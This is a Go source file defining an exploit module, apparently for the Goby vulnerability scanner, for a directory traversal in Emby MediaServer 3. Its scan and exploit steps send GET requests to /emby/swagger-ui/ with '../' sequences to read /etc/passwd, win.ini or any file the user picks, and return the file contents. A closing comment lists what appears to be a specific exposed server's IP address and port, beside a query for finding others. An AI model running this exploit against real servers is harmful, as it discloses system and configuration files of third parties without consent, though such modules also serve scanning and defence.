package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Emby MediaServer 3 Directory Traversal File Disclosure",
    "Description": "\\nThe vulnerability was confirmed on tested platforms depending on the version. Version 3.1.0 is affecting Linux, Windows and Mac platforms. The 3.2.5 only affects Windows release. Input passed via the 'swagger-ui' object in SwaggerService.cs is not properly verified before being used to load resources. This can be exploited to disclose the contents of arbitrary files via directory traversal attacks.",
    "Product": "Emby-MediaServer",
    "Homepage": "https://www.emby.media/",
    "DisclosureDate": "2021-06-13",
    "Author": "sharecast.net@gmail.com",
    "GobyQuery": "header=\"X-Emby-Authorization\"",
    "Level": "2",
    "Impact": "<p>Disclosure of source code, database configuration files and so on, leading to the site in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. Restricted directory.</p><p>2. Whitelist defines the path that can be read.</p><p>3. upgrade to the latest version.</p>",
    "References": [
        "https://www.seebug.org/vuldb/ssvid-96966"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "createSelect",
            "value": "../../../../../../../../../../../../etc/passwd,../../../../../../../../../../../../windows/win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/emby/swagger-ui/../../../../../../../../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/emby/swagger-ui/../../../../../../../../../../../../windows/win.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[extensions]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/emby/swagger-ui/{{{file}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [
        "File Inclusion"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6821"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//http://5.39.95.99:8096
//  "GobyQuery": "icon_hash=\"902188936\"||header=\"X-Emby-Authorization\"",
